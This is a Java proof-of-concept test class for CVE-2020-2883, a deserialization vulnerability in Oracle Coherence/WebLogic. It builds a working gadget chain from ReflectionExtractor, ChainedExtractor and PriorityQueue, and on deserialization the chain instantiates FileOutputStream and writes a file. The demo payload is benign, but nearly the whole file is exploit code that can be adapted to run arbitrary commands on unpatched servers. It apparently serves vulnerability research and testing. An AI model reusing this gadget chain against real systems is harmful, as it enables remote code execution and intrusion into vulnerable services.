package com.feihong.testcase;

import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestFileOutputStreamWithCVE_2020_2883 {
    public static void main(String args[]) throws Exception {

        byte[] payload = "CVE_2020_2883 works!".getBytes();

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[]{String.class}}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[]{"CVE_2020_2883.txt"}}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "write",
                new Object[]{payload}
        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2,
                extractor3
        };
        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = FileOutputStream.class;
        queueArray[1] = "1";

        //序列化
        byte[] bytes = Util.serialize(queue);

        //反序列化
        Util.deserialize(bytes);
    }
}
